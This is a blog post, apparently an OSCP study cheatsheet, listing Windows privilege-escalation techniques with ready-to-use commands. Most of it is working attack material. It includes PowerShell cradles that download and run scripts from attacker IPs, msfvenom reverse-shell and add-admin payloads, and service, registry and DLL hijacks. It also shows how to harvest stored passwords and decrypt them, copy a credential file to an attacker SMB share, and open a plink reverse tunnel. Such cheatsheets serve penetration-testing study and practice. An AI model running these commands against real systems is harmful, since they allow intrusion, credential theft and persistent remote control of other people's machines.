---
layout: post
title: Windows PrivEsc cheatsheet
tags: [OSCP, Cheatsheet, Windows]
description: "Windows PrivEsc cheatsheet"
---

# Table of contents

- [Introduction](#introduction)
- [Tools](#tools)
- [Kernel](#kernel)
- [Services](#services)
  - [BinPath](#binpath)
  - [Unquoted Service Path](#unquoted-service-path)
  - [Registry](#registry)
  - [Executable file](#executable-file)
  - [DLL Hijacking](#dll-hijacking)
- [Password mining](#password-mining)
  - [Passwords stored by user](#passwords-stored-by-user)
  - [Registry](#registry)
  - [Configuration Files](#configuration-files)
- [Registry](#registry)
  - [AutoRun](#autorun)
  - [AllwaysInstallElevated](#allwaysinstallelevated)
- [Scheduled Tasks](#scheduled-tasks)
- [Hot Potato](#hot-potato)
  - [Detect](#detect)
  - [Exploit](#exploit)
- [Startup Aplications](#startup-aplications)
- [Firewalled Services](#firewalled-services)

# Introduction
The goal of this cheat sheet is to provide a quick overview of possible attack vectors that can be used to elevate your privileges to the system. For each attack vector, it explains how to detect if a system is vulnerable and gives an example of how to exploit it.   

# Tools
Before learning about the different attack vectors, I listed some commands for the general privesc enumeration scripts that I used during OSCP. To gain some efficiency, I moved all the scripts into a directory and made them accessible remotely through the samba service or via the web.   
```
#host files in current directory through smb
impacket-smbserver share $(pwd)
impacket-smbserver -smb2support share $(pwd)   // for Windows 10

#host files in current directory through http
python -m SimpleHTTPServer 8080
python3 -m http.server 8080
```

Below, I listed the different PrivEsc tools and files that I would generally have hosted through the **SMB** and **HTTP** server for quick access.
```
accesschk64.exe
accesschk.exe
accesschk-XP.exe
Invoke-PowerShellTcp.ps1
PowerUp.ps1
SharpUp.exe
Sherlock.ps1
windows-exploit-suggester2.py
winPEASany.exe
winPEASx64.exe
winPEASx86.exe
winbin/ #a copy of windows binaries in /usr/share/windows-binaries/
    nc64.exe
    nc.exe
    plink.exe
    wget.exe
    whoami.exe
    chisel.exe
```

I used the following commands to launch the tools quickly without having to transfer them first on the target itself.  
```
#WinPEAS - I love this tool
//192.168.194.141/share/winPEASx64.exe searchall cmd
#PowerUp
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.73:1234/PowerUp.ps1'); Invoke-AllChecks"
#Sherlock
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.194.141:1234/Sherlock.ps1'); Find-AllVulns"
```

# Kernel
Missing patches are probably the easiest way to improve your privileges. However, this can make your target system unstable, so only use them when you are desperate, I recommend taking this route as a last resort as there are times when the system can corrupt and lead to problems when hacking the machine.  


**Detect if vulnerable:** Get patchlevel and check for exploits  
```
#Check for what services we have write access by specifying one of our user roles (also check for the power users group)
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Everyone" *

#Check our permissions for one specific service
accesschk.exe -ucqv daclsvc

#Check under what privileges a system runs
sc qc daclsvc
```

Exploit - Always used a public exploit and never waste time compiling your own kernel exploits. You can find a list of precompiled exploits here:   
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)    

# Services
When elevating our privileges through the services on a Windows machine, we search for services that run under system privileges and that we can manipulate in such a way that when the service restarts, our exploit is executed.

## BinPath
Each Windows service specifies the location of the executable that has to be executed through the configuration variable 'BinPath'. If we can change the BinPath variable to the location of our payload and make it run under LocalSystem privileges, we are in.   
**How to detect vulnerable services:** You are looking for services that you have write access to. This way you can adjust the binary path of the executable that is normally executed to the location of your exploit.   
```
# Check for what services we have write access by specifying one of our user roles (also check for the power users group)
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Everyone" *

# Check our permissions for one specific service
accesschk.exe -ucqv daclsvc

# Check under what privileges a system runs
sc qc daclsvc
```   
You basically need one of the following permissions to the service and then you're good to go:   

| Permission            | Why good for us?                                              |
| --------------------- | ------------------------------------------------------------- |
| SERVICE_CHANGE_CONFIG | Can reconfigure the service binary                            |
| WRITE_DAC             | Can reconfigure permissions, leading to SERVICE_CHANGE_CONFIG |
| WRITE_OWNER           | Can become owner, reconfigure permissions                     |
| GENERIC_WRITE         | Inherits SERVICE_CHANGE_CONFIG                                |
| GENERIC_ALL           | Inherits SERVICE_CHANGE_CONFIG                                |   

*To elevate privileges the BinPath way, services don't have to be configured to run under LocalSystem. As we can alter the configuration, we can also specify under what privileges it should run.*   

#### Exploit  
```
# Change the privileges to LocalSystem if that is not yet the case
sc config daclsvc obj= ".\LocalSystem" password= ""

# add command in path
sc config daclsvc binpath= "net localgroup administrators xhack /add"

# restart service
sc start daclsvc

# verify if the user 'xhack' is succesfully added to the administrators group
net localgroup Administrator
```

## Unquoted Service Path
If the service binary path is not enclosed within quotes and is having spaces, it would handle the space as a break and pass the rest of the service path as an argument. For example, if we have an executable in the following unquoted directory ```C:\Program Files\Unquoted Path Service\Common Files\uncsvc.exe```, then Windows will look for the executable consecutively in following paths:  
```
C:\Program.exe
C:\Program Files\Unquoted.exe
C:\Program Files\Unquoted Path Service\Common.exe
C:\Program Files\Unquoted Path Service\Common Files\uncsvc.exe
```
If we can place our payload in one of previous locations and restart the service, our executable is run instead of the intended executable.   
**How to detect vulnerable services:** You're looking for services that meet the following three criteria:  
- The path of the binary location does not contain quotes.    
- Service runs under LocalSystem.   
- You have write access to one of the exploitable directories.   

```
# Check for services in which the executable paths don't contain quotes
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """

# Do following checks for unquoted service paths:
#service runs under system (SERVICE_START_NAME: LocalSystem)
sc qc unquotedsvc

#extra verification if bin path is unquoted (BINARY_PATH_NAME)
sc qc unquotedsvc

#you have write access to one of these directories
icacls "C:\ "
icacls "C:\Program Files"
icacls "C:\Program Files\Unquoted Path Service"
```   

#### Exploit

```
#Choose the name of the exploit according to the paths the system will look for the binaries
#in our example below, we have write access to the "C:\Program Files\Unquoted Path Service\" directory
C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe

# Therefor we choose the name following binary name --> common.exe

#create exploit
msfvenom -p windows/exec CMD='net user xhack SecurePass1337 /add; net localgroup administrators xhack /add' -f exe-service -o common.exe

#place exploit in the target folder, so in here
C:\Program Files\Unquoted Path Service\

#restart service
sc start unquotedsvc
```   

## Registry
The ```HKLM\SYSTEM\CurrentControlSet\Services``` registry tree stores information about each service on the system. On of the variables is the location of the service binary. When we can change the service binary to our executable, we are king.    
Note that this approach is very similar to the BinPath way, but this time we use the registry instead of the ```sc``` command line utility.   
**How to detect vulnerable services:**  To exploit this vulnerability, services need to meet the following two requirements:   
- We have write access to the registry of the service   
- The service is running with LocalSystem privileges    

```
#1. get a list of all services
accesschk64.exe -kvusw hklm\System\CurrentControlSet\services
powershell -nop -exec bypass -c "Get-Acl -Path hklm:\System\CurrentControlSet\services\* | select Path,AccessToString | Format-List"

#2. copy the list to sublime/notepad++/...

#3. search for following strings (based on powershell output)
    "NT AUTHORITY\INTERACTIVE Allow  FullControl" #(Everybody that logs in on physical computer, gets assigned to group INTERACTIVE)
    "BUILTIN\Users Allow  FullControl "
    "NT AUTHORITY\Authenticated Users FullControl"
    "Everyone Allow FullControl"
    other groups you are part of (whoami /all)
```   
#### Exploit

```
#create payload
msfvenom -p windows/exec CMD='net user xhack SecurePass1337 /add; net localgroup administrators xhack /add' -f exe-service -o payload.exe

#place payload in writable folder
cd C://Temp
cp //192.168.194.141/share/tmp/payload.exe .

#change registry path to executable (regsvc is vulnerable service name in this example)
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\payload.exe /f

#restart service
sc start regsvc

```

## Executable File
Sometimes, you don't have to think too hard. If you can simply change the executable file with your payload, this could be a viable path to privilege escalation.   

**How to detect vulnerable services:** Search for services that run as LocalSystem. For each of these services, check whether you have write access to the executable that is executed by the service. This makes the following requirements:   
- We have write access to the executable of the service
- The service is running with LocalSystem privileges

```
#for each service, check  the permissions of the executable, if you have write / full access, overwrite executable with own payload
accesschk64.exe -wvu  "C:\Program Files\File Permissions Service"   
```   
> Tip: To speed up the process (not having to check all services), only verify the services that WinPEAS marks as 'Special' aka non-default services.   

#### Exploit
```
#Create your payload
msfvenom -p windows/exec CMD='net user xhack SecurePass1337 /add; net localgroup administrators xhack /add' -f exe-service -o payload.exe

#place payload in writable folder (in the example below, filepermservice.exe is the vulnerable executable)
cd "c:\Program Files\File Permissions Service"
cp //192.168.194.141/share/tmp/payload.exe .
mv payload.exe filepermservice.exe

#restart service
sc start regsvc
```   

## DLL Hijacking
Services often run programs that on their turn, load and execute separate DLLs. These DLLs are not always secured with the correct privileges, or are just not present on the current system. When we can make a service (with system privileges) load our malicious payload instead, we can use it to get system.    
**How to detect vulnerable services:**  I haven't figured out a foolproof way of detecting vulnerable DLLs so I will kindly refer you to fuzzysecurity's guide:   
[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)   

```
#Check the path you are using
echo %path%

#Check for all dirs in path what access  rights you have
accesschk.exe -dqv "C:\Python27"
cacls "C:\Python27"

#Check if any service is calling for DLL's that do not exist on the system
	#if you have RDP, you can use Process Monitor from the systinternals suite
	#check in the registry if any dll is loaded ("ServiceDLL")
	#search for the location of the DLL
	dir wlbsctrl.dll /s

#check if the service restarts at boot time
sc qc IKEEXT
	START_TYPE:    2 AUTO_START
```

#### Exploit

```
#generate malicious DLL
msfpayload windows/shell_reverse_tcp lhost=10.11.0.79 lport=9988   -o <name of hijackable dll>.dll

#place dll in writable path folder

#reboot system / restart service
```

# Password mining
Administrators are often lazy and use weak passwords or reuse them. When performing our password mining, we scout for (hashed) passwords that administrators maybe reused for their main account. Further these passwords could also get us access to other services like databases.   
#### Passwords stored by user
Sometimes users store their passwords in plain-text in an unsecured file. When we can find these passwords, it is a quick win for us.   

```
# Check for files in home folders of users with names that could mean they hold passwords
dir /s C:\Users
```   

## Passwords stored by user
Sometimes users store their passwords in plain-text in an unsecured file. When we can find these passwords, it is a quick win for us.   

```
#check for files in home folders of users with names that could mean they hold passwords
dir /s C:\Users
```

## Registry
Sometimes developers and admins store passwords of services in the registry.

```
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"
	--> crack password with vncpwd.exe

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword

# SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
	#NOTE: if you get redirected, use that redirect
	reg query "HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\BWP123F42"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

## Configuration Files

When programs have to authenticate to other services, the passwords are often stored in the configuration files. The following list contains juicy files that could get us lucky.   
1. Windows configuration files   

```
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml
```

2. Config files of web server

```
#search for the file
C:\inetpub\wwwroot\web.config
#search for password in following line "connectionString"
```

3. VNC config files

```
dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b
dir c:\ /s /b | findstr /si *vnc.ini
```

4. McAfee SiteList

```
#on target
#search for file SiteList.xml
dir /s/b SiteList.xml
#copy file to kali (after setting up impacket-smbserver)
cp "C:\Users\All Users\McAfee\Common Framework\SiteList.xml" //192.168.194.141/share/tmp

#on kali
#grep encrypted password
grep -i password SiteList.xml
#decrypt password
python mcafee_sitelist_pwd_decrypt.py [encryptedpassw
```

5. group policy preference

```
#getting the file:
    # Output environment-variables
    set
    # Look for the following:
    LOGONSERVER=\\NAMEOFSERVER
    USERDNSDOMAIN=WHATEVER.LOCAL
    # Look up ip-addres
    nslookup nameofserver.whatever.local
    # It will output something like this
    Address:  192.168.1.101
    # Now we mount it
    net use z: \\192.168.1.101\SYSVOL
    # And enter it
    z:
    # Now we search for the groups.xml file
    dir Groups.xml /s

#decrypting the password
    #the pass is AES encrypted but the key is publicly known
    gpp-decrypt encryptedpassword

#other files for which this might be the case
    Services\Services.xml #Element-Specific Attributes
    ScheduledTasks\ScheduledTasks.xml #Task Inner Element, TaskV2 Inner Element, ImmediateTaskV2 Inner Element
    Printers\Printers.xml #SharedPrinter Element
    Drives\Drives.xml #Element-Specific Attributes
    DataSources\DataSources.xml #Element-Specific Attributes
```

6. The getting desperate searches

```
#find the string 'password' in all files of certain file type
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#Find all these strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*
```



# Registry
## AutoRun
Programs that are listed as autorun in the registry are executed automatically when users login to the system. What is interesting to us, is that the executable runs with the privileges of the user that logs in.   
**Detect vulnerable autorun programs:** We need the following two requirements:   
- We need a startup program for which we have write access to the binary   
- We need an Administrator to login into the system   

```
#check what programs run on startup
wmic startup get caption,command 2>nul
#check if you have write access to the binary of the executable
icacls "C:\Program Files\Autorun Program\program.exe"
```

#### Exploit
- replace executable with reverse shell / admin user add command
- wait till someone logs in with admin 


## AllwaysInstallElevated
When the AlwaysInstallElevated key is set for HKLM and HKCU in the registry, each newly installed program automatically gets system privileges. We just have to install our payload and we have **system**.    
#### detect vulnerability:   

```
# check if AlwaysInstallElevated key is set
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```   

##### Exploit

```
# Generate payload
msfvenom -p windows/reverse_shell_tcp LHOST=<ip attack> LPORT=<port> -f msi > shell.msi

# Install msi file
msiexec /quiet /qn /i C:\Windows\Temp\shell.msi
```    

# Scheduled Tasks
Through scheduled tasks, admins can specify what programs should start immediately after booting the system. When we can replace the binary that would be loaded, we can get our payload executed with higher privileges.    
**How to detect vulnerable scheduled tasks:** First get a list of all scheduled task with system privileges, then check if you have write access to the binary. This makes the following requirements:    

- The scheduled task runs under system   
- You have write access to the executable to which the task points (or exe is missing)   

```
#on target
#List all scheduled tasks with system privileges
schtasks /query /fo LIST /v

#on machine attack
#copy over list and check for tasks as system
cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM

#on target
#check if you have write access to executable to which the task points
accesschk.exe -dqv "C:\Missing Scheduled Binary\"
```   

#### Exploit
```
#Generate new payload
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o test.exe
#replace the task executable with our payload
```   


# Hot Potato
This technique is a combination of two known windows issues like NBNS spoofing and NTLM relay with the implementation of a fake WPAD proxy server which is running locally on the target host.   
NTLM authentication via the same protocol like SMB has been already patched by Microsoft however this technique is using HTTP to SMB authentication in order to create a high privilege service as the HTTP request might come from a high privilege service like the Windows update. Since the traffic contains the NTLM credentials and is passing through a fake proxy server it can be captured and passed to a local SMB listener to create an elevated service which can execute any command as SYSTEM.   

## Detect
Check the privileges of the current user. If the user has one of following privs, you can get system.   
- SeImpersonatePrivilege   
- SeAssignPrimaryPrivilege   
- SeTcbPrivilege   
- SeBackupPrivilege   
- SeRestorePrivilege   
- SeCreateTokenPrivilege   
- SeLoadDriverPrivilege   
- SeTakeOwnershipPrivilege   
- SeDebugPrivilege   

## Exploit
When you have ```SeImpersonatePrivilege``` or ```SeAssignPrimaryPrivilege``` you can get system through the **Rotten Potato exploit**. The updated version of this exploit is called **Juicy Potato**.   
```
#executable - JuicyPotato
#generate reverse  shell that we want to trigger as a system shell
msfvenom -p windows/shell_reverse_tcp LHOST=$kaliip LPORT=444 -e x86/shikata_ga_nai -f exe -o rev.exe

#trigger the exploit (https://github.com/ivanitlearning/Juicy-Potato-x86/releases)
JuicyPotato.exe -l 1340 -p C:\users\User\rev.exe -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}

#Powershell - Invoke-Tater1
powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.194.141:1234/Invoke-Tater.ps1'); Invoke-Tater -Trigger 1 -Command 'net localgroup Administrators user /add'"
```

# Startup Aplications

#### Detect if vulnerable:

```
#Check if you have write permissions to startup folder
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```   

#### Exploit:
- Generate payload and place it in this folder.    
- restart the machine with Administrator credentials.   

# Firewalled Services
Some machines firewall several ports such that they are only accessible from the localhost. If we can execute code through services that are running as system, we can elevate our privileges to system.   
#### Detect for vulnerable services:
```
# Check what interfaces are only available to the localhost (compare to your nmap scan)
netstat -ano

# Check the executable from a specific service
tasklist /fi "pid eq <PID>"
```   

#### Exploit
For databases, you can gain RCE through the command functionality or find passwords in the database itself.   

When dealing with web apps that are only accessible to the localhost, we can forward them to our kali machine:   
```
# On machine attack // example 10.10.10.12
# Start the SSH service
service ssh start

#place the plink.exe binary in the smb shared folder
# On the target
# Tunnel the traffic
//10.10.10.12/share/plink.exe root@10.10.10.12 -R 4000:127.0.0.1:80

# Here 10.11.0.79 is ip of machine attack
# 4000 is local port on kali to bind web app to
# 80 is local port on target that we want to forward

#on kali
# Go in the browser to following url and you should see the forwarded web app
http://localhost:4000    
```   
